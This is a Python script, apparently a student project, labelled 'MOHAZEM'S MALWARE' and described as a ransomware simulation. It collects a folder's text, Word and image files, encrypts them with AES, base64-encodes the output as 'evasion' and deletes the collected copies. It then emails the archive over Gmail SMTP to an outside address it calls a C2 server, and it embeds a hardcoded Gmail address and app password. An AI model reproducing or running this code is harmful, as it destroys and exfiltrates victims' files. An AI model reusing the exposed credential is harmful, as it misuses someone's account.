import os
import shutil
import base64  # <-- Added for evasion
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# ===== BASE64 EVASION =====
def base64_encode(file_path):
    """Encode binary file to Base64."""
    with open(file_path, "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data)
    with open(file_path, "wb") as f:
        f.write(encoded)

def base64_decode(file_path):
    """Decode Base64 file to binary."""
    with open(file_path, "rb") as f:
        data = f.read()
    decoded = base64.b64decode(data)
    with open(file_path, "wb") as f:
        f.write(decoded)

# ===== COMBINED FILE COLLECTOR =====
def collect_files(source_dir, output_folder):
    """Collect .txt, .docx, .jpg files into a folder."""
    os.makedirs(output_folder, exist_ok=True)
    for root, _, files in os.walk(source_dir):
        for file in files:
            if file.lower().endswith(('.txt', '.docx', '.jpg')):
                src = os.path.join(root, file)
                dest = os.path.join(output_folder, file)
                shutil.copy2(src, dest)
    return output_folder

# ===== ENCRYPTION =====
def encrypt_folder(folder_path, password):
    """Encrypt folder to 'malware_encrypted.log' and save key separately."""
    try:
        # Create ZIP
        shutil.make_archive('temp_archive', 'zip', folder_path)
        
        # Generate IV + salt
        iv = os.urandom(16)
        salt = os.urandom(16)

        # Derive key
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = kdf.derive(password.encode())

        # Save key separately to key.bin
        with open('key.bin', 'wb') as key_file:
            key_file.write(key)

        # Encrypt the ZIP
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        with open('temp_archive.zip', 'rb') as f:
            data = f.read()
            padded = data + bytes([16 - len(data) % 16] * (16 - len(data) % 16))  # PKCS#7 padding
            encrypted = iv + salt + encryptor.update(padded) + encryptor.finalize()
        
        # Save the encrypted file
        with open('malware_encrypted.log', 'wb') as f:
            f.write(encrypted)

        # Apply Base64 evasion
        base64_encode('malware_encrypted.log')

        # Cleanup
        os.remove('temp_archive.zip')
        shutil.rmtree(folder_path)
        return True

    except Exception as e:
        print(f"[!] Encryption failed: {e}")
        return False

# ===== DECRYPTION =====
def decrypt_file(encrypted_path, password):
    """Decrypt function for recall.py with full path handling"""
    try:
        # Path normalization
        encrypted_path = os.path.abspath(os.path.normpath(encrypted_path.strip('"\'')))
        print(f"\n[*] Verifying: {encrypted_path}")
        
        if not os.path.isfile(encrypted_path):
            print(f"[!] CRITICAL: File not found")
            print(f"[*] Current directory: {os.getcwd()}")
            print("\nFiles in target folder:")
            for f in os.listdir(os.path.dirname(encrypted_path)):
                print(f"- {f}")
            return False
        
        # Base64 decode first
        base64_decode(encrypted_path)

        # Read encrypted data
        with open(encrypted_path, "rb") as f:
            iv = f.read(16)
            salt = f.read(16)
            ciphertext = f.read()
        
        # Key derivation
        key = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        ).derive(password.encode())
        
        # Decryption
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        decrypted = decrypted[:-decrypted[-1]]  # Remove padding
        
        # Output handling
        output_folder = "decrypted_files"
        os.makedirs(output_folder, exist_ok=True)
        
        temp_zip = os.path.join(output_folder, "temp_recovered.zip")
        with open(temp_zip, "wb") as f:
            f.write(decrypted)
        
        shutil.unpack_archive(temp_zip, output_folder, "zip")
        os.remove(temp_zip)
        
        print(f"\n[+] DECRYPTION SUCCESSFUL!")
        print(f"[*] Files saved to: {os.path.abspath(output_folder)}")
        return True
        
    except ValueError:
        print("\n[!] Invalid password or corrupted file!")
    except Exception as e:
        print(f"\n[!] FATAL ERROR: {str(e)}")
    return False

# ===== EXFILTRATION =====
def exfiltrate_data():
    """Send encrypted file via email."""
    try:
        msg = MIMEMultipart()
        msg['From'] = "m7md7azem17@gmail.com"
        msg['To'] = "mh2200696@tkh.edu.eg"
        msg['Subject'] = "System Report"
        
        with open('malware_encrypted.log', 'rb') as f:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', 'attachment; filename="system.log"')
        msg.attach(part)
        
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login("m7md7azem17@gmail.com", "uuil ppot yonl kxcj")
            server.send_message(msg)
        return True
    except Exception as e:
        print(f"[!] Exfiltration failed: {e}")
        return False

# ===== MAIN MENU =====
def main():
    print(r"""
    ███╗   ███╗ █████╗ ██╗      ██╗    ██╗ █████╗ ██████╗ ███████╗
    ████╗ ████║██╔══██╗██║      ██║    ██║██╔══██╗██╔══██╗██╔════╝
    ██╔████╔██║███████║██║      ██║ █╗ ██║███████║██████╔╝█████╗  
    ██║╚██╔╝██║██╔══██║██║      ██║███╗██║██╔══██║██╔══██╗██╔══╝  
    ██║ ╚═╝ ██║██║  ██║███████╗╚███╔███╔╝██║  ██║██║  ██║███████╗
    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
    """)
    print("🔥" * 50)
    print("          W E L C O M E   T O   M O H A Z E M ' S   M A L W A R E")
    print("🔥" * 50 + "\n")

    while True:
        print("\n⚡" * 25)
        print("           🎮 M A I N   M E N U 🎮")
        print("⚡" * 25)
        print("\n[1] 🔒 Encrypt & Exfiltrate (Ransomware Sim)")
        print("[2] 🔓 Decrypt Files (Whitehat Mode)")
        print("[3] ☠ Exit Cyber Ops")
        choice = input("\n>>> OPERATION SELECTION (1/2/3): ").strip()

        if choice == '1':
            print("\n💣" * 15 + " DEPLOYING MALWARE " + "💣" * 15)
            target_folder = input("\n[?] 🗂️ Enter TARGET folder path: ").strip()
            if not os.path.exists(target_folder):
                print("\n[!] 🚨 CRITICAL ERROR: Target folder not found!")
                print("     Possible solutions:")
                print("     1. Check path spelling")
                print("     2. Use drag & drop into terminal")
                print("     3. Verify folder exists\n")
                continue

            password = input("[?] 🔑 Set ENCRYPTION KEY: ").strip()
            print("\n[+] 🕵️‍♂️ Collecting intelligence files...")
            collected = collect_files(target_folder, "malware_target")
            
            print("[+] 🔄 Encrypting with military-grade AES-256...")
            if encrypt_folder(collected, password):
                print("\n[✔] 💀 MISSION SUCCESS! All targets encrypted as 'malware_encrypted.log'")
                if input("[?] ☁️ Exfiltrate to C2 server? (y/n): ").lower() == 'y':
                    print("\n[+] 🚀 Launching exfiltration protocol...")
                    if exfiltrate_data():
                        print("[✔] 📡 Email sent successfully to shadow server!")
                    else:
                        print("[!] 📡 Connection failed - storing locally")

        elif choice == '2':
            print("\n🛡️" * 15 + " ACTIVATING COUNTERMEASURES " + "🛡️" * 15)
            encrypted_file = input("\n[?] 🔍 Path to encrypted payload: ").strip()
            if not os.path.exists(encrypted_file):
                print("\n[!] 🚨 ALERT: Encrypted payload not detected!")
                print("     Scan your system for 'malware_encrypted.log'\n")
                continue
            
            password = input("[?] 🔓 Enter DECRYPTION KEY: ").strip()
            print("\n[+] 🧠 Decrypting with NSA-approved protocols...")
            if decrypt_file(encrypted_file, password):
                print("\n[✔] 🌐 SYSTEM RECOVERED! Files restored to 'decrypted_files'")
                print("     All hostile payloads neutralized\n")

        elif choice == '3':
            print("\n" + "🖥️" * 20)
            print("     OPERATION TERMINATED - STAY VIGILANT AGENT")
            print("🖥️" * 20 + "\n")
            break

        else:
            print("\n[!] ⚠️ INVALID OPERATION CODE - TRY AGAIN")

if __name__ == "__main__":
    main()
